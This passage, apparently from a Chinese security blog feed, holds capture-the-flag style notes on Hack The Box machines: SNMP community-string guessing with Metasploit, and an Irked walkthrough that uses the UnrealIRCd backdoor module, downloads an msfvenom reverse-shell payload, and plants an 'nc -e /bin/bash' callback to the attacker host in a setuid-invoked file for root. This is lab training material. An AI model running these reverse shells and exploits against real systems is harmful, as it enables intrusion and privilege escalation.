class="hljs-number">2</span><br><span class="hljs-attribute">10</span>.<span class="hljs-number">120</span>.<span class="hljs-number">20</span>.<span class="hljs-number">0</span>     <span class="hljs-number">10.78.11.2</span>      <span class="hljs-number">255.255.255.0</span>   UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth<span class="hljs-number">2</span><br></code></pre></div></td></tr></table></figure><h4 id="内网python扫描"><a href="#内网python扫描" class="headerlink" title="内网python扫描"></a>内网python扫描</h4><p><a href="https://raw.githubusercontent.com/AnthraX1/InsightScan/master/scanner.py">https://raw.githubusercontent.com/AnthraX1/InsightScan/master/scanner.py</a></p><p>wget <a href="http://10.10.14.7/scanner.py">http://10.10.14.7/scanner.py</a></p><p>/usr/bin/python3.5 scanner.py -h</p><p>python2.7和python3.5不兼容，目标主机只有python3.5,导致该py脚本无法运行。</p><h4 id="上传nmap"><a href="#上传nmap" class="headerlink" title="上传nmap"></a>上传nmap</h4><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-12/8.PNG" alt="8"></p><p>待续</p>]]></content>
    
    
    <categories>
      
      <category>training</category>
      
    </categories>
    
    
    <tags>
      
      <tag>training</tag>
      
      <tag>command execution</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>snmp&amp;snmpwalk</title>
    <link href="/2019/03/11/x/"/>
    <url>/2019/03/11/x/</url>
    
    <content type="html"><![CDATA[<h2 id="161端口——snmp协议"><a href="#161端口——snmp协议" class="headerlink" title="161端口——snmp协议"></a>161端口——snmp协议</h2><p>参考资料：</p><ul><li><a href="http://www.freebuf.com/vuls/133517.html">http://www.freebuf.com/vuls/133517.html</a></li><li><a href="http://www.cnblogs.com/LittleHann/p/3834860.html">http://www.cnblogs.com/LittleHann/p/3834860.html</a></li></ul><p>SNMP = simple network manage protocol = 简单网络管理协议</p><p>一个路由器，用SNMP协议报告带宽利用率、冲突率等信息。当snmp协议 配置不当，会泄露系统信息。</p><p>？该服务的目的。为了管理网络设备。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-11/1.png" alt="1"></p><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p>开启msfconsole后</p><p>use scanner/snmp/snmp_enum</p><p>set RHOSTS 192.168.1.0/24（配合zmap寻找目标）</p><p>set THREADS 50</p><p>run 开始扫描</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-11/2.png" alt="2"></p><p>一连找了7、8个161开放的主机，但是snmp请求总是超时。</p><p>…… 可能是哪里出现了问题。</p><p>!  snmp_enum是用来寻找161开放主机的…… 它效率还不高</p><p>在已获得目标的情况下，用snmp_login尝试登陆</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-11/3.png" alt="3"></p><p>在我几乎要放弃的时候，奇迹发生了：》</p><p>可以看到它的权限是 read-only只读，如果运气好找到 read-write 那就更好了。</p><blockquote><p>默认账号和密码：public、private</p><p>snmp弱口令探测(这里的弱口令是指snmp管理时用到的团体字符串。一般可读权限的为public,可读可写的默认为private)</p></blockquote><p>snmpwalk 使用snmp协议，请求OID对象标识。</p><p><code>snmpwalk -c public -v 1 10.10.10.105</code></p><h2 id="Metasploit的snmp辅助模块"><a href="#Metasploit的snmp辅助模块" class="headerlink" title="Metasploit的snmp辅助模块"></a>Metasploit的snmp辅助模块</h2><p><a href="https://www.offensive-security.com/metasploit-unleashed/snmp-scan/">原文</a> </p><div class="hljs code-wrapper"><pre><code>   继续我们的信息搜集，让我们看看 SNMP扫描。snmp在寻找具体的系统信息方面 ，或者实际的获取远程设备权限方面很有用。如果你能够发现cisco设备运行着 private字符串，你可以下载整个设备的设置，更改它，并且上传你自己的恶意代码。通常密码是7等级加密，这意味着它们很容易就能解密并获取登陆密码。</code></pre></div><p>Metasploit内置了辅助模块用来扫描snmp设备。这里有许多要点需要知道在我们开始snmp扫描之前。</p><p>首先<code>read only</code> 和 <code>read write</code> public字符串对于什么类型的信息能够被获取或者更改很重要。如果你能‘猜’出只读或者读写字符串，你可以获取很多平常方法获取不到的入口。并且，如果基于windows的设备配置了snmp，经常是 只读或者读写团体字符串，你可以获取补丁等级，运行的服务，上一次关机时间，系统的用户名，途径，和许多对于攻击者很有用的方法。</p><p>注意：默认的Metasploitable（用来测试meta的linux靶机，译者注） 的smnp设备仅仅监听localhost。这里有许多示范来使你改变这些默认设置。开启并编辑“/etc/defauld/snmpd”</p><p>并且改变下面的：</p><blockquote><p>SNMPDOPTS=’-Lsd -Lf /dev/null -u snmp -I -smux -p /var/run/snmpd.pid 127.0.0.1’</p></blockquote><p>变为：</p><blockquote><p>SNMPDOPTS=’-Lsd -Lf /dev/null -u snmp -I -smux -p /var/run/snmpd.pid 0.0.0.0’</p></blockquote><p>设置需要重启生效。一旦重启，你可以在攻击机器上扫描这个设备了。</p><h4 id="什么MIB？"><a href="#什么MIB？" class="headerlink" title="什么MIB？"></a>什么MIB？</h4><p>当探索snmp时，这里有叫做mib的API。MIB代表management information base，管理信息库。</p><blockquote><p><em><strong>SNMP协议有3种方式在客户端和远程SNMP设备之间进行身份验证，在SNMP v1和SNMPv2版本中，使用可读的字符串数据类型即社区字符串（公开或私有）来进行认证。</strong></em></p><p>而在SNMP_v3<strong>中，用户则可以选择用户名、密码和身份认证方式进行安全验证。另外，像对象标识符（oids）和陷阱消息（traps）等其它内容信息将会统一保存在管理信息库（MIB）中进行存储。译者注</strong>_</p></blockquote><p>这个界面允许你探寻设备并且提取信息。Matasploit载入了一些默认的MIBs，在数据库里，meta使用它们来寻找更多的信息取决于获取的入口的等级。让我们来看看辅助模块。</p><blockquote><p>search snmp  使用snmp_login爆破登陆名</p><p>use auxiliary/scanner/snmp/snmp_login</p><p>set RHOSTS ip范围</p><p>set THREADS 10</p><p>run</p></blockquote><blockquote><p>…… </p><p>[*]**192.168.1.50 ‘public’ **’APC Web/SNMP Management Card (MB:v3.8.6 PF:v3.5.5 PN:apc_hw02_aos_355.bin AF1:v3.5.5 AN1:apc_hw02_sumx_355.bin MN:AP9619 HR:A10 SN: NA0827001465 MD:07/01/2008) (Embedded PowerNet SNMP Agent SW v2.2 compatible)’[*]Auxiliary module execution completed</p></blockquote><p>(上面是有用的部分的扫描结果)我们可以找到一个团体字符串‘public’。这最可能是read-only 并且没有揭示很多信息。我们知道了这个设备是APC Web/SNMP设备，和运行的版本。</p><h4 id="SNMP-Enum"><a href="#SNMP-Enum" class="headerlink" title="SNMP Enum"></a>SNMP Enum</h4><p>当运行snmp扫描模块，我们可以搜集到许多信息例如开放端口，服务，主机名，进程，和正常运行时间。</p><p>使用metasploitable虚拟机作为我们的目标，我们将运行 <strong>auxiliary/scanner/snmp/snmp_enum</strong>模块，并且看看会提供给我们什么信息。首先我们加载模块并且设置RHOST选项，使用存储在我们的workspace里的信息。</p><p>使用 host -R 将会为我们设置这个选项。</p>]]></content>
    
    
    <categories>
      
      <category>tools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Irked（suid提权）</title>
    <link href="/2019/03/10/x/"/>
    <url>/2019/03/10/x/</url>
    
    <content type="html"><![CDATA[<h2 id="info"><a href="#info" class="headerlink" title="info:"></a>info:</h2><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sS -Pn IP<br><span class="hljs-attribute">22</span>/tcp  open  ssh     OpenSSH <span class="hljs-number">6</span>.<span class="hljs-number">7</span>p<span class="hljs-number">1</span> Debian <span class="hljs-number">5</span>+deb<span class="hljs-number">8</span>u<span class="hljs-number">4</span> (protocol <span class="hljs-number">2</span>.<span class="hljs-number">0</span>)<br><span class="hljs-attribute">80</span>/tcp  open  http    Apache httpd <span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">10</span> ((Debian))<br><span class="hljs-attribute">111</span>/tcp open  rpcbind <span class="hljs-number">2</span>-<span class="hljs-number">4</span> (RPC #<span class="hljs-number">100000</span>)<br><br><br><span class="hljs-attribute">22</span>/tcp    open  ssh     OpenSSH <span class="hljs-number">6</span>.<span class="hljs-number">7</span>p<span class="hljs-number">1</span> Debian <span class="hljs-number">5</span>+deb<span class="hljs-number">8</span>u<span class="hljs-number">4</span> (protocol <span class="hljs-number">2</span>.<span class="hljs-number">0</span>)<br><span class="hljs-attribute">80</span>/tcp    open  http    Apache httpd <span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">10</span> ((Debian))<br><span class="hljs-attribute">111</span>/tcp   open  rpcbind <span class="hljs-number">2</span>-<span class="hljs-number">4</span> (RPC #<span class="hljs-number">100000</span>)<br><span class="hljs-attribute">6697</span>/tcp  open  irc     UnrealIRCd<br><span class="hljs-attribute">8067</span>/tcp  open  irc     UnrealIRCd<br><span class="hljs-attribute">49074</span>/tcp open  status  <span class="hljs-number">1</span> (RPC #<span class="hljs-number">100024</span>)<br><span class="hljs-attribute">65534</span>/tcp open  irc     UnrealIRCd<br><br></code></pre></div></td></tr></table></figure><h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">irked.jpg</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span>IRC is almost working!<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>Apache/2.4.10</p><p>10.10.10.117/manual/img/</p><h2 id="IRC"><a href="#IRC" class="headerlink" title="IRC"></a>IRC</h2><figure class="highlight accesslog"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs accesslog">searchsploit UnrealIRCd<br><br>浏览器访问以下地址，<span class="hljs-number">6697</span>获得了一条信息：“ERROR :Closing Link: <span class="hljs-string">[10.10.14.13]</span> (Throttled: Reconnecting too fast) -Email djmardov@irked.htb for more information.”<br><span class="hljs-number">10.10.10.117:6697</span><br><span class="hljs-number">10.10.10.117:8067</span><br><span class="hljs-number">10.10.10.117:65534</span><br><br>search UnrealIRCd<br></code></pre></div></td></tr></table></figure><h2 id="irc-rc"><a href="#irc-rc" class="headerlink" title="irc.rc"></a>irc.rc</h2><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-10/3.PNG" alt="3"></p><p>msfconsole -r irc.rc</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">use exploit/unix/irc/unreal_ircd_3281_backdoor<br><span class="hljs-builtin-name">set</span> RHOST<span class="hljs-built_in"> IP</span><br><span class="hljs-built_in"></span><span class="hljs-builtin-name">set</span> RPORT 6697<br><span class="hljs-builtin-name">run</span><br><br>shell<br>python -c <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></code></pre></div></td></tr></table></figure><p>获得一个shell<br><code>find . -name &quot;user.txt&quot; 2&gt;/dev/null</code> 尝试获得user.txt，权限不够</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight gradle"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gradle">os : Linux irked <span class="hljs-number">3.16</span>.<span class="hljs-number">0</span>-<span class="hljs-number">6</span>-<span class="hljs-number">686</span>-pae #<span class="hljs-number">1</span> SMP Debian <span class="hljs-number">3.16</span>.<span class="hljs-number">56</span>-<span class="hljs-number">1</span>+deb8u1 (<span class="hljs-number">2018</span>-<span class="hljs-number">05</span>-<span class="hljs-number">08</span>) i686 GNU/Linux<br><br>pwd:  <span class="hljs-regexp">/home/i</span>rcd/Unreal3.<span class="hljs-number">2</span><br><br>whoami : ircd<br><br>cat <span class="hljs-regexp">/etc/</span>passwd | <span class="hljs-keyword">grep</span> home<br>djmardov:x:<span class="hljs-number">1000</span>:<span class="hljs-number">1000</span>:djmardov,,,:<span class="hljs-regexp">/home/</span>djmardov:<span class="hljs-regexp">/bin/</span>bash<br>ircd:x:<span class="hljs-number">1001</span>:<span class="hljs-number">1001</span>::<span class="hljs-regexp">/home/i</span>rcd:<span class="hljs-regexp">/bin/</span>sh<br><br>cd <span class="hljs-regexp">/;find . -name &quot;user.txt&quot; 2&gt;/</span>dev/<span class="hljs-keyword">null</span><br>.<span class="hljs-regexp">/home/</span>djmardov<span class="hljs-regexp">/Documents/u</span>ser.txt<br><br>python -c <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br>su djmardov<br><br>cat unrealircd.conf | <span class="hljs-keyword">grep</span> pass<br>获得疑似口令：f00Ness、f00、moocowsrulemyworld、LiNk<br><br><span class="hljs-keyword">find</span> . -name <span class="hljs-string">&quot;id_rsa&quot;</span> <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span><br><span class="hljs-keyword">find</span> . -name <span class="hljs-string">&quot;*.pub&quot;</span>找到了一个路径，查看ssh配置文件<br><br>gcc -v<br>gcc version <span class="hljs-number">4.9</span>.<span class="hljs-number">2</span> (Debian <span class="hljs-number">4.9</span>.<span class="hljs-number">2</span>-<span class="hljs-number">10</span>+deb8u1)<br><br>sudo not found<br></code></pre></div></td></tr></table></figure><h4 id="尝试1"><a href="#尝试1" class="headerlink" title="尝试1"></a>尝试1</h4><p><a href="https://www.exploit-db.com/exploits/38390">Linux Kernel 3.0 &lt; 3.3.5</a><br>提权失败<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-10/4.PNG" alt="4"></p><p><code>use post/multi/recon/local_exploit_suggester</code>没有发现任何可用exp</p><h4 id="尝试2"><a href="#尝试2" class="headerlink" title="尝试2"></a>尝试2</h4><p><code>msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=7766 -f elf -o payload.elf</code></p><p>wget <a href="http://10.10.14.7/payload.elf">http://10.10.14.7/payload.elf</a></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-10/1.PNG" alt="1"></p><p>local_exploit_suggester，有收获，但exp执行不成功</p><figure class="highlight applescript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs applescript">[+] <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.117</span> - exploit/linux/<span class="hljs-keyword">local</span>/network_manager_vpnc_username_priv_esc: The target service <span class="hljs-keyword">is</span> <span class="hljs-built_in">running</span>, <span class="hljs-keyword">but</span> could <span class="hljs-keyword">not</span> be validated.<br>[+] <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.117</span> - exploit/linux/<span class="hljs-keyword">local</span>/pkexec: The target service <span class="hljs-keyword">is</span> <span class="hljs-built_in">running</span>, <span class="hljs-keyword">but</span> could <span class="hljs-keyword">not</span> be validated.<br>[*] Post module execution completed<br></code></pre></div></td></tr></table></figure><h4 id="尝试3"><a href="#尝试3" class="headerlink" title="尝试3"></a>尝试3</h4><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-string">python</span> <span class="hljs-string">-m</span> <span class="hljs-string">SimpleHTTPServer</span> <span class="hljs-number">8088</span><br><span class="hljs-string">wget</span> <span class="hljs-string">http://10.10.14.7:8088/linux-exploit-suggester.sh</span><br><br><span class="hljs-string">./linux-exploit-suggester.sh</span><br><br><span class="hljs-attr">Available information:</span><br><br><span class="hljs-attr">Kernel version:</span> <span class="hljs-number">3.16</span><span class="hljs-number">.0</span><br><span class="hljs-attr">Architecture:</span> <span class="hljs-string">i686</span><br><span class="hljs-attr">Distribution:</span> <span class="hljs-string">debian</span><br><span class="hljs-attr">Distribution version:</span> <span class="hljs-number">8</span><br><span class="hljs-string">Additional</span> <span class="hljs-string">checks</span> <span class="hljs-string">(CONFIG_*,</span> <span class="hljs-string">sysctl</span> <span class="hljs-string">entries,</span> <span class="hljs-string">custom</span> <span class="hljs-string">Bash</span> <span class="hljs-string">commands):</span> <span class="hljs-string">performed</span><br><span class="hljs-attr">Package listing:</span> <span class="hljs-string">from</span> <span class="hljs-string">current</span> <span class="hljs-string">OS</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-string">searchsploit</span> <span class="hljs-string">linux</span> <span class="hljs-number">3.16</span><br><br><span class="hljs-bullet">-</span> <span class="hljs-string">尝试shell脚本提示可能有的漏洞dirtyc0w.c</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">CVE-2017-7533</span><br><span class="hljs-string">失败</span><br></code></pre></div></td></tr></table></figure><h4 id="尝试4"><a href="#尝试4" class="headerlink" title="尝试4"></a>尝试4</h4><figure class="highlight gradle"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gradle">root@irked:<span class="hljs-regexp">/tmp# file /u</span>sr<span class="hljs-regexp">/bin/</span>viewuser<br><span class="hljs-keyword">file</span> <span class="hljs-regexp">/usr/</span>bin/viewuser<br><span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/viewuser: setuid ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /</span>lib<span class="hljs-regexp">/ld-linux.so.2, for GNU/</span>Linux <span class="hljs-number">3.2</span>.<span class="hljs-number">0</span>, BuildID[sha1]=<span class="hljs-number">69</span>ba4bc75bf72037f1ec492bc4cde2550eeac4bb, not stripped<br><br>strings <span class="hljs-regexp">/usr/</span>bin/viewuser<br>发现里面有一个<span class="hljs-regexp">/tmp/</span>listusers，查看一下是ascii字符，内容为<span class="hljs-regexp">/bin/</span>bash<br><br>---<br><br><span class="hljs-keyword">file</span> <span class="hljs-regexp">/tmp/</span>listusers<br><span class="hljs-regexp">/tmp/</span>listusers: ASCII text<br><br>cat <span class="hljs-regexp">/tmp/</span>listusers<br><span class="hljs-regexp">/bin/</span>bash<br><br>---<br><br>ls -al <span class="hljs-regexp">/tmp/</span>listusers<br>-rwxr-xr-x <span class="hljs-number">1</span> djmardov djmardov <span class="hljs-number">10</span> Mar  <span class="hljs-number">9</span> <span class="hljs-number">14</span>:<span class="hljs-number">58</span> <span class="hljs-regexp">/tmp/</span>listusers<br><br><span class="hljs-regexp">/usr/</span>bin/viewuser<br>cd <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/; ./</span>viewuser<br><br><span class="hljs-keyword">This</span> application is being devleoped to set and test user permissions<br>It is still being actively developed 它仍在积极开发中<br>(unknown) :<span class="hljs-number">0</span>           <span class="hljs-number">2019</span>-<span class="hljs-number">03</span>-<span class="hljs-number">09</span> <span class="hljs-number">14</span>:<span class="hljs-number">53</span> (:<span class="hljs-number">0</span>)<br><br>rm <span class="hljs-regexp">/tmp/</span>listusers<br>./viewuser <br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-10/11.PNG" alt="11"></p><hr><p><code>ps -ef | grep viewuser</code></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-10/12.PNG" alt="12"></p><p>虽然是以ircd用户运行的viewuser，可以看到进程是以root用户执行的</p><hr><figure class="highlight gradle"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gradle">whereis nc<br>nc -h<br>echo <span class="hljs-string">&quot;/bin/bash  nc -e /bin/bash 10.10.14.7 2233&quot;</span> &gt;<span class="hljs-regexp">/tmp/</span>listusers<br>cat <span class="hljs-regexp">/tmp/</span>listusers<br><br><span class="hljs-regexp">/bin/</span>bash  nc -e <span class="hljs-regexp">/bin/</span>bash <span class="hljs-number">10.10</span>.<span class="hljs-number">14.7</span> <span class="hljs-number">2233</span><br><br>本地运行nc -lnvp <span class="hljs-number">2233</span><br><br>cd <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/; ./</span>viewuser<br>结果：sh: <span class="hljs-number">1</span>: <span class="hljs-regexp">/tmp/</span>listusers: Permission denied<br><br>ls -al <span class="hljs-regexp">/tmp/</span>listusers<br>-rw------- <span class="hljs-number">1</span> root ircd <span class="hljs-number">43</span> Mar <span class="hljs-number">10</span> <span class="hljs-number">03</span>:<span class="hljs-number">54</span> <span class="hljs-regexp">/tmp/</span>listusers<br><br>chmod +x <span class="hljs-regexp">/tmp/</span>listusers<br><br>ls -al <span class="hljs-regexp">/tmp/</span>listusers<br>-rwx------  <span class="hljs-number">1</span> root ircd   <span class="hljs-number">43</span> Mar <span class="hljs-number">10</span> <span class="hljs-number">03</span>:<span class="hljs-number">58</span> listusers<br><br>cd <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/; ./</span>viewuser<br>结果<br><span class="hljs-regexp">/bin/</span>nc: <span class="hljs-regexp">/bin/</span>nc: cannot execute binary <span class="hljs-keyword">file</span><br><br>nc -e <span class="hljs-regexp">/bin/</span>bash <span class="hljs-number">10.10</span>.<span class="hljs-number">14.7</span> <span class="hljs-number">2233</span><br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-10/13.PNG" alt="13"></p>]]></content>
    
    
    <categories>
      
      <category>training</category>
      
    </categories>
    
    
    <tags>
      
      <tag>training</tag>
      
      <tag>linux os</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Lazy（密码学相关）</title>
    <link href="/2019/03/09/x/"/>
    <url>/2019/03/09/x/</url>
    
    <content type="html"><![CDATA[<figure class="highlight elixir"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elixir"><span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">6.6</span>.<span class="hljs-number">1</span>p1 Ubuntu <span class="hljs-number">2</span>ubuntu2.<span class="hljs-number">8</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)<br>| ssh-<span class="hljs-symbol">hostkey:</span> <br>|   <span class="hljs-number">1024</span> <span class="hljs-symbol">e1:</span><span class="hljs-number">92</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">b:</span><span class="hljs-number">48</span><span class="hljs-symbol">:f8</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span><span class="hljs-symbol">b:</span><span class="hljs-number">63</span><span class="hljs-symbol">:</span><span class="hljs-number">96</span><span class="hljs-symbol">:d4</span><span class="hljs-symbol">:e5</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">a:</span><span class="hljs-number">40</span><span class="hljs-symbol">:</span><span class="hljs-number">5</span><span class="hljs-symbol">f:</span><span class="hljs-symbol">a4:</span><span class="hljs-symbol">c8:</span><span class="hljs-number">33</span> (DSA)<br>|   <span class="hljs-number">2048</span> <span class="hljs-symbol">af:</span><span class="hljs-symbol">a0:</span>0<span class="hljs-symbol">f:</span><span class="hljs-number">26</span><span class="hljs-symbol">:cd</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">a:</span><span class="hljs-symbol">b5:</span><span class="hljs-number">1</span><span class="hljs-symbol">f:</span><span class="hljs-symbol">a7:</span><span class="hljs-symbol">ec:</span><span class="hljs-number">40</span><span class="hljs-symbol">:</span><span class="hljs-number">94</span><span class="hljs-symbol">:ef</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">c:</span><span class="hljs-number">81</span><span class="hljs-symbol">:</span><span class="hljs-number">5</span>f (RSA)<br>|   <span class="hljs-number">256</span> <span class="hljs-number">11</span><span class="hljs-symbol">:a3</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">f:</span><span class="hljs-number">25</span><span class="hljs-symbol">:</span><span class="hljs-number">73</span><span class="hljs-symbol">:</span><span class="hljs-number">67</span><span class="hljs-symbol">:af</span><span class="hljs-symbol">:</span><span class="hljs-number">70</span><span class="hljs-symbol">:</span><span class="hljs-number">18</span><span class="hljs-symbol">:</span><span class="hljs-number">56</span><span class="hljs-symbol">:fe</span><span class="hljs-symbol">:a2</span><span class="hljs-symbol">:e3</span><span class="hljs-symbol">:</span><span class="hljs-number">54</span><span class="hljs-symbol">:</span><span class="hljs-number">81</span><span class="hljs-symbol">:e8</span> (ECDSA)<br>|_  <span class="hljs-number">256</span> <span class="hljs-number">96</span><span class="hljs-symbol">:</span><span class="hljs-number">81</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span><span class="hljs-symbol">c:</span><span class="hljs-symbol">f4:</span><span class="hljs-symbol">b7:</span><span class="hljs-symbol">bc:</span><span class="hljs-number">1</span><span class="hljs-symbol">a:</span><span class="hljs-number">73</span><span class="hljs-symbol">:</span>05<span class="hljs-symbol">:ea</span><span class="hljs-symbol">:ba</span><span class="hljs-symbol">:</span><span class="hljs-number">41</span><span class="hljs-symbol">:</span><span class="hljs-number">35</span><span class="hljs-symbol">:a4</span><span class="hljs-symbol">:</span><span class="hljs-number">66</span><span class="hljs-symbol">:b7</span> (ED25519)<br><span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2.4</span>.<span class="hljs-number">7</span> ((Ubuntu))<br>|_http-server-<span class="hljs-symbol">header:</span> Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">7</span> (Ubuntu)<br>|_http-<span class="hljs-symbol">title:</span> CompanyDev<br>Service <span class="hljs-symbol">Info:</span> <span class="hljs-symbol">OS:</span> Linux; <span class="hljs-symbol">CPE:</span> <span class="hljs-symbol">cpe:</span>/<span class="hljs-symbol">o:</span><span 